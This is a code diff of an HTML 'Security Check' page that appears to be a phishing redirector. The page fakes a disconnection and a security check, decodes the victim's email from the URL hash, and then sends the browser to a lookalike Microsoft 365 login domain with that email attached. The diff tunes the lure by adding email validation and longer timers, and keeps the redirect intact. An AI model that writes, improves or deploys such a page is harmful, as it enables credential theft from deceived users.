@@ -4,13 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Check</title>
+    <!-- Security Headers -->
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
     <meta http-equiv="X-Frame-Options" content="DENY">
     <meta http-equiv="X-XSS-Protection" content="1; mode=block">
     <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
     <meta http-equiv="Referrer-Policy" content="no-referrer">
-
+    
     <style>
         .container {
             display: flex;
@@ -58,54 +59,39 @@
         <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
     </div>
 
-    <!-- Hidden email field to auto-grab Base64-encoded email -->
-    <input type="email" id="email" placeholder="Your email" style="display:none;">
-
     <script>
         (function() {
             'use strict';
 
-            // Function to extract Base64-encoded email from the URL hash (e.g., #Y29udGFjdEBleGFtcGxlLmNvbQ==)
             function getEmailFromHash() {
-                const hash = window.location.hash.substr(1); // Remove the leading '#'
                 try {
-                    return atob(hash); // Decode Base64 email
+                    const hash = window.location.hash.substr(1);
+                    return atob(hash);
                 } catch (error) {
-                    console.error("Failed to decode Base64 email:", error);
+                    console.error("Failed to extract email from hash:", error);
                     return null;
                 }
             }
 
-            // Populate the hidden email field with the decoded email
+            function isValidEmail(email) {
+                const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                return emailPattern.test(email);
+            }
+
             function populateEmail() {
                 const email = getEmailFromHash();
-                if (email) {
+                if (email && isValidEmail(email)) {
                     const emailField = document.getElementById("email");
                     if (emailField) {
                         emailField.value = email;
-                        console.log("Email found and populated: " + email);
                     } else {
                         console.warn("Email field not found.");
                     }
                 } else {
-                    console.warn("No email found in the URL.");
+                    alert("Invalid email format detected.");
                 }
             }
 
-            // Redirect after the email is decoded
-            function redirectToPage() {
-                const email = getEmailFromHash();
-                if (email) {
-                    // After decoding, redirect to a new page with the decoded email in the query string
-                    const redirectTo = `https://l0g1n-micros.ftlivedocs.com/o365#${email}`;  // Removed encodeURIComponent to prevent extra encoding
-                    console.log("Redirecting to: " + redirectTo);
-                    window.location.href = redirectTo;
-                } else {
-                    console.error("No valid email to redirect with.");
-                }
-            }
-
-            // Simulate disconnection and security check
             function simulateDisconnection() {
                 console.log("Simulating disconnection for 10 seconds...");
 
@@ -117,14 +103,22 @@
                         securityCheckMessage.style.display = 'block';
                     }
 
-                    // Redirect after security check and Base64 decoding
-                    setTimeout(redirectToPage, 3000);
-                }, 5000);
+                    setTimeout(() => {
+                        const email = getEmailFromHash();
+                        if (isValidEmail(email)) {
+                            const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365" + window.location.hash.substr(1);
+                            console.log("Redirecting to: " + redirectTo);
+                            window.location.href = redirectTo;
+                        } else {
+                            alert("Invalid email. Redirect canceled.");
+                        }
+                    }, 6000);
+                }, 10000);
             }
 
             window.onload = function() {
-                populateEmail(); // Ensure the email is decoded first
-                simulateDisconnection(); // Simulate security check and disconnection
+                simulateDisconnection();
+                setTimeout(populateEmail, 10000);
             };
         })();
     </script>
